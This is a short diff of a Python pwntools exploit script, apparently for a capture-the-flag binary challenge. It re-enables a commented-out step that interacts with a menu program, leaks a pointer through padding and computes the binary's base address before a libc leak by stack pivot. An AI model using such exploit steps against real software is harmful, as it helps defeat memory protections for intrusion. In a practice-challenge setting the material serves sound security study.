@@ -16,7 +16,7 @@ io = process(executable)
 
 log.info('get leaked address')
 
-"""
+
 io.sendlineafter('\n> ', '2')
 io.sendlineafter('sell? ', 'qq')
 leak_padding = b'7' * leak_padding_offset
@@ -27,7 +27,7 @@ binary_offset = bytearray(binary_offset).ljust(8, b'\x00')
 binary_offset = u64(binary_offset, endian='little')
 binary_offset -= 0x40c0
 log.success(f'Leaked binary offset: {str(hex(binary_offset))}')
-"""
+
 
 log.info('leaking LIBC address with stack pivot')
 
